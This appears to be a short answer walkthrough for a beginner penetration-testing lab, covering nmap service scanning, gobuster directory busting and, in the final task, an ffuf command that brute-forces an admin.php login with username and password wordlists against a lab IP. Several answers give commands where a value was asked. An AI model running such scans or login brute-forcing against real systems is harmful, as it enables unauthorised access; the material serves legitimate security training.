# Task 1: Directory Brute-forcing is a technique used to check a lot of paths on a web server to find hidden pages. Which is another name for this? (i) Local File Inclusion, (ii) dir busting, (iii) hash cracking.
dir busting

# Task 2: What switch do we use for nmap's scan to specify that we want to perform version detection
-sV

# Task 3: What does Nmap report is the service identified as running on port 80/tcp?
http

# Task 4: What server name and version of service is running on port 80/tcp?
`nmap -sV 10.129.117.185`

# Task 5: What switch do we use to specify to Gobuster we want to perform dir busting specifically?
dir

# Task 6: When using gobuster to dir bust, what switch do we add to make sure it finds PHP pages?
-x php

# Task 7: What page is found during our dir busting activities?
gobuster dir -u http://10.129.117.185 -x php -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

# Task 8: What is the HTTP status code reported by Gobuster for the discovered page?
200

# Task 9: Flag
`ffuf -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt:FUZZ1 -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt:FUZZ2 -u http://10.129.93.114/admin.php -X POST -d "username=FUZZ1&password=FUZZ2" -H "Content-Type: application/x-www-form-urlencoded" -fs 1071`
